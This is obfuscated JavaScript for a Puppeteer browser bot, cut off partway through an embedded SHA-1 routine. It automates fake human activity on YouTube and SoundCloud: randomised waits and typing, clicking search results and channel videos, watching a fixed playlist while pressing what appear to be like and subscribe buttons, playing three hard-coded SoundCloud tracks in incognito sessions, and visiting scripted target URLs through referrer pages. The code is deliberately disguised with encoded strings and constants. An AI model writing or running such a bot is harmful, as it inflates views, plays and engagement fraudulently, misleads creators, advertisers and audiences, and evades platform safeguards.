const U = b,
  T = d,
  S = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x2ab * -0xb + -0x86d + -0x14eb))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x8f9 + -0x7 * -0x28b + -0x8d4), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xe413 * -0x1 + -0x137 * 0x12 + -0xd * 0x6d9 + (-0x4360 + 0x5e0d + 0x1feb) * random()) : await standardWaitForNetIdle(f), await wait(0xccc + 0xe93 + -0x7d7 + (0x12b6 + 0x305 * -0x5 + 0x2373) * random()), -0x1 * 0x82 + 0x1b * -0x171 + 0x276e;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x13c4 + -0xdf1 * -0x2 + -0x1 * 0x1c1e), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x360 * 0x3 + 0x5bd * -0x1 + 0xfde;
}
async function randomWait() {
  return await wait(-0x16fd + 0x2 * -0x754 + -0x35d * -0x11 + (0x1732 + 0x26bf + 0x3 * -0xe23) * random()), -0x1f2e + 0xd2a + 0x7 * 0x293;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1f24 * 0x1 + -0x11a * -0xf + 0xe9e, -0x1457 * -0x1 + 0xf56 + 0x6 * -0x5f1), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xa11a * 0x1 + 0x16b * 0xe9 + 0x1011d * -0x1) * getRandomInt(-0x42d * 0x3 + 0x35 * 0x13 + 0x89a, -0xfdd * -0x1 + -0x17b1 + 0x1 * 0x7d9), h)), 0xee3 + 0xb7 * 0x1d + -0x239d;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x14dd + -0x1 * 0x16a1 + 0x2b7e * 0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x676 * 0x1 + -0x3 * 0xc5b + 0x1c * 0x18e]['split']('\x20');
    for (let k = -0xf66 + 0x2b2 + -0x65a * -0x2; k < i['length']; k += 0xba3 + -0x4e4 + -0x6bd)
      j += i[k] * h[i[k + (-0xb1 * -0x19 + -0x124 * -0x1c + -0x3138)]];
    return j;
  });
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x822 * -0x4 + -0x2 * 0xf6d + -0x5 * 0x56);
    let h = e[f];
    if (c['gOYafI'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1df1 + -0x48a * -0x4 + 0xbc9, r, s, t = 0x92 * -0x29 + -0x1 * 0x2201 + -0xf9 * -0x3b; s = m['charAt'](t++); ~s && (r = q % (-0x2065 + -0x94 * 0x24 + -0x5 * -0xaa5) ? r * (-0x44d + -0x2604 * -0x1 + -0x293 * 0xd) + s : s, q++ % (0xd6d + -0xa45 * 0x1 + -0x324)) ? o += String['fromCharCode'](-0x287 * 0x2 + 0xccc + -0x6bf & r >> (-(0x95b + 0x78d * -0x1 + -0x1cc) * q & -0x1 * 0x82 + 0x1b * -0x171 + 0x2773)) : 0x13c4 + -0xdf1 * -0x2 + -0x2 * 0x17d3) {
          s = n['indexOf'](s);
        }
        for (let u = -0x360 * 0x3 + 0x5bd * -0x1 + 0xfdd, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x16fd + 0x2 * -0x754 + -0x563 * -0x7))['slice'](-(0x1732 + 0x26bf + 0x3 * -0x14a5));
        }
        return decodeURIComponent(p);
      };
      c['OYWtGV'] = i, b = arguments, c['gOYafI'] = !![];
    }
    const j = e[-0x1f2e + 0xd2a + 0x4 * 0x481],
      k = f + j,
      l = b[k];
    return !l ? (h = c['OYWtGV'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x2166 + -0x1d48 + -0x106 * 0x4)['map'](l => Array['from'](l['children']))['flat'](0x5b1 + 0x1ee0 + -0x2490)['map'](l => l['childNodes'][0x1 * -0x611 + 0xae8 + 0x1 * -0x4d6]['childNodes'][0xfaa + 0x175a + -0x1c6 * 0x16]['childNodes'][0xc0d + 0x2616 + 0x3222 * -0x1]['childNodes'][0x4c + 0x2 * 0xc11 + -0x3b * 0x6a]['childNodes'][-0x3a8 * -0x3 + -0xd * -0x2ff + -0x31ea]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1 * -0x1914 + 0x1 * 0x1d4c + -0x3278, -0xf08 + 0x176 * -0xa + 0x312c)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x89 * 0xc1 + 0x6861 * 0x1 + -0x9512);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1087c + -0x2f20 * -0x6 + 0xd81c) * getRandomInt(-0x756 + 0x7 * -0x67 + -0x1 * -0xa29, -0x2588 + 0x12b2 + 0x649 * 0x3), h);
  return await wait(i), 0x1a05 * 0x1 + -0x1934 + 0x8 * -0x1a;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1adc + -0x12 * -0x2 + -0x1b00]['children'][0x2604 + -0x25f1 + -0x13]['children'][0x268f + -0x5e * -0x15 + 0x67 * -0x73]['children'][-0x63b + 0x1f01 + -0x18c6]['children'][-0x6 * 0x5a7 + -0x1d4f + 0x3f39]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x2e + -0x1013 * 0x1 + 0x821 * 0x2;
}
async function searchAndView(f) {
  const af = {
      f: 'StYb'
    },
    R = b;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x5b3 + 0x1 * 0x2306 + -0x1cef + (0x6 * 0x58f + -0xb * 0xf2 + 0x796 * -0x3) * random()
  }), await wait(-0x62d * 0x2 + 0x216 * -0x9 + 0x2114 + (-0x1602 + -0x3 * -0x81c + 0xe * -0x15) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xbec + -0x380 * 0x4 + -0x1 * -0x216]['childNodes'][0x5 * -0x3c9 + -0x25 * 0x4a + -0x3b4 * -0x8]['childNodes'][-0x1199 + 0x1aac + -0x912]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x7a3 * 0x5 + 0x201b + -0x4645]['childNodes'][0x18a * 0x16 + -0x2061 + -0x17b * 0x1]['childNodes'][-0x1ba + -0x1 * -0x970 + -0x11 * 0x74]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0xa78 + -0x264c + 0xf * 0x1db),
          r = 0x286 * -0x7 + -0x8f * 0x2c + 0x1 * 0x2a3e;
        for (let u = 0xca2 + -0x449 + -0x859; u < q['length']; u += 0x991 + 0x89b + -0x122a)
          r += q[u] * k[q[u + (-0x8 * -0x4ae + -0x2 * 0x12f7 + 0x7f)]];
        return r;
      }(n);
  });
  await wait((-0x6291 + 0x1fd1 + 0x7d58) * Math['random']()), await f['click']('#__hookedV' + R(0x6, af.f));
  let i = Math['min']((0x1 * 0x6b03 + -0x19e3b + 0x8766 * 0x4) * getRandomInt(-0xc48 * -0x2 + -0x210a + -0xa7 * -0xd, -0xec0 + 0xd7f * 0x1 + 0x14b), h + (-0x1 * 0xafb + -0x5 * 0x579 + 0x39e0));
  return await wait(i), 0x267b + 0x1c34 + 0x1e * -0x239;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x15 * -0xc + 0x5f7 + -0x6f3), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1 * -0x1ac6 + -0x1c22 + 0xd14 + (-0xf39 + -0x1ded + 0x310e) * Math['random']());
    });
  }, -0x11 * 0x204 + 0x22 * -0x147 + 0x690a);
  await wait(0xa * -0x7f1 + -0x35857 * -0x1 + 0x18af3 * 0x1);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xa880 + 0x5 * -0x3fcd + 0x180e1 * 0x1) * getRandomInt(0x24a2 + 0x1ca * -0x3 + 0x40 * -0x7d, 0x14f2 + 0x1a5d + -0x2f36)), clearInterval(h), -0x15 * 0x1c + -0x142c + 0x20b * 0xb;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2 * 0xf89 + 0xf17 + -0x2e29;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x1ea4 + -0x2562 * 0x1 + 0x6bf;
    await randomWait();
  }
  return -0xcde + 0x171 * -0x1b + 0x33ca;
}

function fetchRandomSC() {
  return Math['random']() <= -0x5f8 + 0x13b9 + -0xdc1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x178f + -0x2 * -0x313 + 0x1169 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1 * -0x206b + 0x53 * -0x31 + 0x1 * 0x304e + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x2623 + 0x180d + 0x1 * -0x3e30;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1 * -0xb413 + -0x3f4c * 0x4 + 0xf8e5 + getRandomInt(0x5986 + 0x5bfa + 0x12 * -0x6d4, 0x9 * -0x17d5 + -0x3 * 0x194a + 0x1 * 0x1978b));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x389 + 0x73 * -0x6 + 0x63c), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xf30 + -0x1d14 + 0x2c44;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x99e + -0x83 * 0x31 + 0x1 * 0xf75, -0x9b * 0x37 + 0x1 * 0xd65 + 0x141a)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x2 * 0x172 + 0x21 * -0xc6 + 0x12 * 0x1b1 + floor((-0x2 * 0x617 + 0x8a * 0x2f + -0x940) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x99aaccb6 + 0x1cca4438 + 0x7e70443f * 0x2),
          0x4 * -0x33894a + -0x460ecc + -0x6 * -0x435dfe,
          -0x1 * -0xa358 + 0x50c0 + -0x7418,
          0x1d5b + 0x137b + -0x21a * 0x17
        ], y = [
          0x4 * 0x528 + 0x1854 + -0x12 * 0x27e,
          0x42e * -0x5 + -0x2282 + 0x3778,
          0x7 * 0x446 + -0x123c + -0x47 * 0x2a,
          -0x1b38 + 0xe * -0x24c + 0x1db * 0x20
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x6fb * 0x1 + -0x599 * -0x4 + -0xf68)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x58c + -0x187f + 0x1e0b; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1e10 + -0x3b6 * 0x8 + -0x3 * 0x20) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1 * 0x15e4 + -0x221a + 0x1 * 0x37fe] = A[-0x1882 + 0x1765 * -0x1 + -0x2ff7 * -0x1] = A[-0xa22 + 0x21 * 0x79 + -0x2bb * 0x2] = A[0x2531 + -0x8f5 + -0x2 * 0xe1d] = A[-0x44f * 0x5 + 0x107 * 0x1f + 0xa4b * -0x1] = A[-0xf9a + 0x107f * -0x1 + -0x201d * -0x1] = A[-0x546 + 0x358 * -0x8 + 0x200b] = A[-0x61 * -0x1f + 0x33f + -0xef8] = A[0x4 * -0x3b6 + 0x2208 + -0x9 * 0x221] = A[0x12be * -0x1 + -0x1 * 0x2123 + -0x1 * -0x33e9] = A[-0x1581 + -0x7c0 + -0x17 * -0x146] = A[0xdf2 + -0x567 + -0x881] = A[-0x2 * 0xb27 + 0x133 * 0xd + -0xad * -0xa] = A[-0x16 * -0xef + 0x1ca7 + 0x223 * -0x17] = A[-0x1 * -0x1a5 + 0x16f1 + -0xb * 0x23b] = A[0x4dc + 0xe5 * -0x25 + 0x1 * 0x1c4b] = A[-0x26 * -0xdb + -0x213a + -0x1 * -0xc7] = 0xd85 + -0x9ba + -0x1 * 0x3cb, this['blocks'] = A) : this['blocks'] = [
                0x7c8 + -0xcfe + 0x536,
                -0x1 * -0x4e3 + -0x2609 + 0x2126,
                -0x1237 + -0xbb * 0x25 + 0x169f * 0x2,
                -0x2 * -0xbab + 0x1 * 0x2083 + -0x37d9,
                0x1e5d + 0x2 * -0x31 + -0x5 * 0x5ff,
                0x1 * -0x1a9 + 0x3b * -0x95 + 0x2400,
                -0xbd + 0x22db * 0x1 + -0x221e,
                -0x3c5 + 0xa9b + -0x6d6,
                0xf * -0x267 + 0x865 * -0x4 + -0x47 * -0xfb,
                -0x246d * -0x1 + -0xd90 + -0x79f * 0x3,
                -0x53 * -0x52 + -0x416 + -0x1680,
                -0x5 * 0x647 + -0x1cde + 0x3c41,
                0x35 * -0x2e + -0xb3f * 0x3 + 0x2b43,
                0x58d + -0x56e + -0x1f,
                0x1c47 + -0x5 * -0x23d + -0xc * 0x34a,
                -0x7 * 0x95 + -0x1ca9 + 0x14 * 0x1a3,
                -0x9d1 + 0x637 + -0x1 * -0x39a
              ], this['h0'] = 0xcb620 * 0x676 + -0x1b18c9d3 + -0x303d3a14 * -0x1, this['h1'] = 0x3 * 0x3c37978f + 0x6ea5dc2b * 0x1 + -0x337ef74f, this['h2'] = -0x9a38b02e + 0x36366e9a + 0xfcbd1e92, this['h3'] = -0x103f99a2 + -0x1391aa80 + 0xa858 * 0x4f19, this['h4'] = 0xf6c2e608 + 0xf61a12b2 + -0x3 * 0x63035cee, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1 * -0x25e1 + -0x1cd9 + 0x215d * 0x2, this['finalized'] = this['hashed'] = 0x3 * -0xb19 + -0x33 * 0xa4 + -0x3 * -0x15fd, this['first'] = -0x1b31 * 0x1 + -0xfe + 0x1c30;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * -0xeb5 + 0x8 * -0x3bf + -0xf43 * -0x1, O = J['length'] || -0x2189 * 0x1 + 0x8 * -0x395 + 0x3e31, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xd44 + -0x1 * 0x496 + 0x11da, P[0xfd3 * -0x2 + 0x2199 + -0x1f3] = this['block'], P[-0x1 * -0x1a27 + 0x30f * 0x9 + 0x2 * -0x1acf] = P[-0xdf7 + 0x1997 * 0x1 + -0xb9f] = P[0x23 * 0xed + -0x5 * -0x141 + -0x26aa] = P[0xe2f + -0x254 + -0xbd8] = P[0xa06 + 0xe5 * -0x17 + 0x21d * 0x5] = P[0x11af * 0x2 + -0x1bca + -0x78f] = P[0x10ea + -0x25f4 + 0x1510] = P[0x2673 + 0x1 * -0x232d + 0x33f * -0x1] = P[0x931 * 0x1 + 0x4 * -0x191 + -0x2e5] = P[-0x158 + 0x1 * -0x16eb + 0x184c] = P[-0xa3f * 0x2 + 0x2f * 0x2b + -0x1 * -0xca3] = P[0x3 * 0xc69 + -0x2618 + 0xe8] = P[0xe9 * -0xd + -0xd42 + 0x1923] = P[0x39 * 0x1f + 0x3 * -0x641 + 0xbe9] = P[-0x12e7 * -0x2 + -0x3 * -0x8b1 + -0x3fd3 * 0x1] = P[0x103 * -0x23 + -0x1 * 0x17c7 + 0x3b3f] = 0x414 + -0x298 + 0x1 * -0x17c), K) {
                    for (N = this['start']; M < O && N < 0x165f + -0x26f0 + 0x10d1; ++M)
                      P[N >> 0x1e58 + -0x742 + 0xd3 * -0x1c] |= J[M] << y[-0x12ba + 0x2292 + 0x1 * -0xfd5 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xc4e + -0xb18 + 0x17a6; ++M)
                      (L = J['charCodeAt'](M)) < 0xe * -0xfc + -0x10c4 + 0x1f0c ? P[N >> 0x9aa + -0x22 * 0x5 + -0x8fe] |= L << y[-0x1 * -0x20ff + -0x11 * 0x5 + 0x283 * -0xd & N++] : L < 0x79 * 0x37 + 0x5c * 0x6b + -0x3873 ? (P[N >> -0x266b + -0xda5 + 0x3412] |= (-0x1c16 + -0xaab + -0x3 * -0xd2b | L >> 0x262c + -0x1952 + -0x2 * 0x66a) << y[-0x5 * 0x4ed + 0x24b7 + 0x119 * -0xb & N++], P[N >> -0x1 * 0xd0 + 0x1240 + -0x116e] |= (-0x3db * 0x1 + 0xa84 * -0x2 + 0x1963 | 0x94b + -0x2171 + 0x1865 & L) << y[-0x1afd + 0xa5d + 0x10a3 & N++]) : L < -0x1c * -0x3a1 + -0x2 * -0x591b + -0x3fd2 || L >= 0xb6 * 0x210 + 0x2d21 + -0x1 * 0xc481 ? (P[N >> -0x11 * -0x134 + 0x2 * 0x1f5 + -0x185c] |= (0x1ee6 + 0x1d39 * 0x1 + -0x3b3f | L >> -0x44f * 0x2 + 0x1 * -0x70c + 0xfb6) << y[-0x1e5e + -0x17cc + -0x362d * -0x1 & N++], P[N >> -0x1bad + 0xbfe + -0x135 * -0xd] |= (0xeb9 + -0x16fe * -0x1 + 0x7 * -0x551 | L >> -0x252a * 0x1 + 0x163b + 0xef5 & 0xb2f + 0x1a1 + 0xc91 * -0x1) << y[0xed * -0x1d + 0x2 * -0xbd7 + 0x328a & N++], P[N >> 0x2326 + 0x1cfd + -0x4021] |= (0xad9 + -0x5 * 0x107 + -0x2 * 0x29b | -0xfa9 + -0x1115 + 0xaff * 0x3 & L) << y[0x99c + 0x1 * -0xb83 + 0x1ea & N++]) : (L = -0xb69a + 0x1d * 0x91d + -0x177 * -0x77 + ((0xcb * 0x8 + -0x1901 * -0x1 + -0x1b5a & L) << -0x246d + 0x1 * 0x71b + -0x1 * -0x1d5c | 0x5a * -0x18 + -0x14e4 + 0x2153 & J['charCodeAt'](++M)), P[N >> 0x3 * 0xc07 + -0x2692 * -0x1 + -0x4aa5] |= (-0x1 * -0x1142 + 0x1 * -0x240b + -0x3 * -0x693 | L >> -0x1955 * -0x1 + -0x32f + 0x9d * -0x24) << y[-0x23 * -0xa3 + -0x130 * 0xb + -0x49b * 0x2 & N++], P[N >> 0x1764 + -0xa * -0x35f + -0x2b8 * 0x15] |= (0x7ca + 0x675 + -0xdbf | L >> -0x78a + 0x157 * 0x17 + -0x173b * 0x1 & 0x1037 + -0x987 * -0x3 + 0x2c8d * -0x1) << y[-0x1 * 0xfd7 + -0x1fc8 + 0x6ce * 0x7 & N++], P[N >> 0x1 * -0x254b + -0x219f + 0x46ec] |= (0x4d * -0x6a + -0x16 * -0x134 + 0x5ea | L >> -0xd76 * 0x2 + 0x18a4 + 0x24e & -0xc * 0x26a + -0x5 * -0x458 + 0x13 * 0x65) << y[0x2 * -0x517 + 0x1102 + -0x6d1 & N++], P[N >> -0xb * -0x2eb + -0x217b * 0x1 + 0x1 * 0x164] |= (-0x1 * 0x67 + -0xf9b + 0x1082 | 0x1 * 0x5cf + -0x1 * -0x6f1 + -0x1 * 0xc81 & L) << y[-0x3 * -0x877 + 0x68 * 0x34 + 0x2 * -0x1741 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x5 * -0x137 + 0x1b75 + -0x1522 ? (this['block'] = P[-0x4 * -0x287 + 0x211c + -0x2b28], this['start'] = N - (-0x2571 + -0x11d3 + -0x4 * -0xde1), this['hash'](), this['hashed'] = 0x1b12 + 0x21af + -0x3cc0) : this['start'] = N;
                }
                return this['bytes'] > 0x3f384180 + -0x2 * 0x34107ed4 + -0x5 * -0x3b61bf3b && (this['hBytes'] += this['bytes'] / (-0x1 * 0xfd841d44 + 0x39a2dd18 + -0x13 * -0x17c87ca4) << -0x4cd * -0x3 + -0x619 + -0x84e, this['bytes'] = this['bytes'] % (-0x2 * 0xaf0034c0 + -0x1f625e6e0 + 0x454265060)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1f * -0x29 + 0x1 * 0x3a1 + 0x7 * 0x31;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x55e + 0x2669 + -0x20fb * 0x1] = this['block'], J[K >> 0x41b * -0x3 + -0x5f + 0xcb2] |= x[0x944 * 0x3 + 0x237c + 0x1 * -0x3f45 & K], this['block'] = J[-0xfa1 + -0xca9 * 0x1 + 0x13 * 0x17e], K >= 0xdc * -0x2b + 0x1423 + -0x31 * -0x59 && (this['hashed'] || this['hash'](), J[-0x1d4b + -0x85a * 0x4 + 0x3eb3] = this['block'], J[-0x295 * -0x6 + 0x1448 + -0x23b6] = J[-0x161 * -0x17 + -0x8a * 0x1 + -0x1f2c] = J[-0xf9f + -0x1b7a * 0x1 + -0x2b1b * -0x1] = J[0x1b50 + 0x107a + -0x2bc7] = J[0x25fe + -0xa3e * -0x1 + -0x3038] = J[0x2 * -0x481 + 0x2c * 0x67 + -0x8ad] = J[-0x1529 + -0x152c + 0x2a5b] = J[-0x7 * -0xc7 + 0x8a7 + -0xe11] = J[0x274 * -0x1 + 0x16 * -0x1af + -0x2 * -0x13c3] = J[-0x4db * -0x7 + 0xf92 + -0x3186] = J[-0x494 * -0x1 + -0x2 * -0x98 + -0x5ba] = J[-0xafa + 0x161 * -0x11 + 0x2276 * 0x1] = J[0x1f5a + -0xd94 * 0x2 + -0x1 * 0x426] = J[-0x1563 + 0x1 * 0x16be + -0xa7 * 0x2] = J[0x203 + 0x4 * -0x2b8 + 0x8eb * 0x1] = J[-0xf82 + 0x6d * -0x7 + 0x128c] = -0x14f5 + 0x11 * 0x193 + -0x5ce), J[-0x1297 * 0x1 + -0x4 * -0x784 + -0xb6b] = this['hBytes'] << 0x1698 + 0xdf7 + -0x2 * 0x1246 | this['bytes'] >>> -0xdf0 + -0x17b7 + -0x2 * -0x12e2, J[0x267 + -0xfc5 + 0xd6d] = this['bytes'] << -0x55d * -0x3 + -0x2663 * -0x1 + 0x1 * -0x3677, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
